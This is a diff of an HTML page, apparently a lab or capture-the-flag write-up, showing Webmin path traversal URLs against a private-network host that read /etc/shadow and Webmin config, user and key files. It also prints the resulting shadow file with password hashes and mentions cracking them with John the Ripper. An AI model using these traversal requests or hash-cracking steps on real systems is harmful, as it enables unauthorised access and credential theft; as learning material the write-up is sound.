@@ -358,15 +358,73 @@ PORT STATE SERVICE VERSION
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
-</span><span class='line'>
-</span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.conf
 </span><span class='line'>
 </span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.users
 </span><span class='line'>
 </span><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/webmin/miniserv.pem</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.0.25:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow
+</span><span class='line'>
+</span><span class='line'>root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
+</span><span class='line'>daemon:*:14040:0:99999:7:::
+</span><span class='line'>bin:*:14040:0:99999:7:::
+</span><span class='line'>sys:*:14040:0:99999:7:::
+</span><span class='line'>sync:*:14040:0:99999:7:::
+</span><span class='line'>games:*:14040:0:99999:7:::
+</span><span class='line'>man:*:14040:0:99999:7:::
+</span><span class='line'>lp:*:14040:0:99999:7:::
+</span><span class='line'>mail:*:14040:0:99999:7:::
+</span><span class='line'>news:*:14040:0:99999:7:::
+</span><span class='line'>uucp:*:14040:0:99999:7:::
+</span><span class='line'>proxy:*:14040:0:99999:7:::
+</span><span class='line'>www-data:*:14040:0:99999:7:::
+</span><span class='line'>backup:*:14040:0:99999:7:::
+</span><span class='line'>list:*:14040:0:99999:7:::
+</span><span class='line'>irc:*:14040:0:99999:7:::
+</span><span class='line'>gnats:*:14040:0:99999:7:::
+</span><span class='line'>nobody:*:14040:0:99999:7:::
+</span><span class='line'>dhcp:!:14040:0:99999:7:::
+</span><span class='line'>syslog:!:14040:0:99999:7:::
+</span><span class='line'>klog:!:14040:0:99999:7:::
+</span><span class='line'>mysql:!:14040:0:99999:7:::
+</span><span class='line'>sshd:!:14040:0:99999:7:::
+</span><span class='line'>vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
+</span><span class='line'>obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
+</span><span class='line'>osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
+</span><span class='line'>yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Using john on /etc/shadow, we obtain credentials of user vmware for successful login to the system:</p>
